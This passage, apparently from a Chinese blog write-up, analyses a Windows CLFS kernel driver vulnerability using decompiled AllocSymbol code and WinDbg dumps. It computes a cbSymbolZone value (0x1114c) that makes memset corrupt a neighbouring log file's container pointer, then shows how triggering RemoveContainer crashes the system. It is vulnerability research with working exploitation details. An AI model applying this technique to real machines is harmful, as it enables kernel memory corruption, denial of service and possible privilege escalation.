style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf060<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">00</span> ff ff<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........P.......</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf070<span style="color:#ae81ff">02</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">27</span><span style="color:#ae81ff">86</span> fc<span style="color:#ae81ff">26</span><span style="color:#ae81ff">07</span><span style="color:#ae81ff">10</span> ee<span style="color:#ae81ff">11</span> ........<span style="color:#960050;background-color:#1e0010">'</span>..<span style="color:#f92672">&amp;</span>....</span></span></code></pre></div><p>回到<code>AllocSymbol</code>中，由于<code>SignatureOffset</code>变为<code>0XFFFF0050</code>，导致即使<code>cbSymbolZone</code> 被设为<code>00000000</code>0001114b<code> 也可以通过if条件判断，到达</code>memset`</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">AllocSymbol</span>(CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v4;<span style="color:#75715e">// rbp</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>BaseLogRecord;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v6;<span style="color:#75715e">// r8 this指针</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>v7;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">*</span>v8;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> cbSymbolZone;<span style="color:#75715e">// r8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>v10;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> result;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> (CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(this);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929421</span>i64;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>i64);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> cbSymbolZone<span style="color:#f92672">=</span> BaseLogRecord<span style="color:#f92672">-></span>cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span> cbSymbolZone<span style="color:#f92672">+</span> v4<span style="color:#f92672">></span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>v8<span style="color:#f92672">-></span>MajorVersion<span style="color:#f92672">+</span> v8<span style="color:#f92672">-></span>SignaturesOffset) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225507</span>i64;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span> cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v10,<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v4);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">-></span>cbSymbolZone<span style="color:#f92672">+=</span> v4;</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span> v10;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1328</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c398<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0001114</span>b<span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">03030000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3a8<span style="color:#ae81ff">00000030</span><span style="color:#960050;background-color:#1e0010">`</span>c1fdf006<span style="color:#ae81ff">000000</span>b8<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">02</span>d20016</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3b8<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3c8<span style="color:#ae81ff">0000136</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000013f</span><span style="color:#ae81ff">0</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3d8<span style="color:#ae81ff">000000</span><span style="color:#ae81ff">88</span><span style="color:#960050;background-color:#1e0010">`</span>c1fdf007<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">9</span>c40<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">01000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3e8<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3f8<span style="color:#ae81ff">01100000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c408<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>那么此处为什么要设为<code>0x1114b</code>呢。</p><p>在多次创建日志文件后，后面创建的每个日志文件的<code>Base log record</code>的内存间距稳定在<code>0x11000</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">-</span><span style="color:#ae81ff">0x70</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x11000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c000<span style="color:#ae81ff">15</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....<span style="color:#f92672">=</span>.<span style="color:#f92672">=</span>.........</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c010<span style="color:#ae81ff">02</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff ................</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c020<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">70</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........p.......</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c030<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c040<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c050<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c060<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">80</span><span style="color:#ae81ff">79</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .........y......</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c070<span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">93</span><span style="color:#ae81ff">76</span><span style="color:#ae81ff">34</span><span style="color:#ae81ff">8f</span><span style="color:#ae81ff">1</span>b<span style="color:#ae81ff">10</span> ee<span style="color:#ae81ff">11</span> .........v4.....</span></span></code></pre></div><p>此处在调试器中后一个日志文件的<code>container context</code>偏移为0x1468</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dw ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c000<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x328</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c398<span style="color:#ae81ff">1468</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3a8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3b8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3c8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3d8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3e8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3f8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c408<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dd ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c000<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x1468</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d4d8 c1fdf008<span style="color:#ae81ff">00000030</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">80000</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d4e8<span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">93e0</span>d330 ffffa78f</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d4f8<span style="color:#ae81ff">00000001</span><span style="color:#ae81ff">00000002</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d508<span style="color:#ae81ff">003f</span><span style="color:#ae81ff">005</span>c<span style="color:#ae81ff">005</span>c003f<span style="color:#ae81ff">003</span>a0043<span style="color:#ae81ff">0055005</span>c</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d518<span style="color:#ae81ff">00650073</span><span style="color:#ae81ff">00730072</span><span style="color:#ae81ff">0050005</span>c<span style="color:#ae81ff">00620075</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d528<span style="color:#ae81ff">006</span><span style="color:#ae81ff">9006</span>c<span style="color:#ae81ff">005</span>c0063<span style="color:#ae81ff">0063002</span>e<span style="color:#ae81ff">006e006</span>f</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d538<span style="color:#ae81ff">00610074</span><span style="color:#ae81ff">006e0069</span><span style="color:#ae81ff">00720065</span><span style="color:#ae81ff">0031005f</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d548<span style="color:#ae81ff">00340031</span><span style="color:#ae81ff">00360037</span><span style="color:#ae81ff">0000003</span><span style="color:#ae81ff">9</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>根据伪代码可知<code>memset</code>的位置为<code>BaseLogRecord + 0x 1338 + cbSymbolZone</code></p><p>如果要利用前一个日志文件在<code>AllocSymbol</code>时修改后一个日志文件的<code>container context→pContainer</code>的高四位则应满足下列条件</p><p><code>ffffa78f</code>9469d4f4 = BaseLogRecord + 0x1338 + cbSymbolZone`，计算可得</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d4f4<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1338</span><span style="color:#f92672">-</span> rax</span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#ae81ff">69964</span><span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0001114</span>c</span></span></code></pre></div><p>通过<code>memset</code>将指针高四位清零后，通过NtSetInformationFile函数为container文件设置属性13（关闭时删除文件）。在关闭日志文件句柄时会调用<code>CClfsBaseFilePersisted::RemoveContainer</code>函数移除container，在该函数中会获取<code>container context</code>并解引用<code>container context→pContainer</code>，由于指针损坏，导致蓝屏。</p><p>在<code>CLFS!CClfsBaseFilePersisted::RemoveContainer</code> 断点</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>bp CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db r15</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d4d8<span style="color:#ae81ff">08</span> f0 fd c1<span style="color:#ae81ff">30</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#ae81ff">.0</span>...........</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d4e8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>e0<span style="color:#ae81ff">37</span> c1<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........<span style="color:#ae81ff">.7</span>......</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d4f8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d508<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d518<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d528<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d538<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d548<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> k</span></span><span style="display:flex;"><span><span 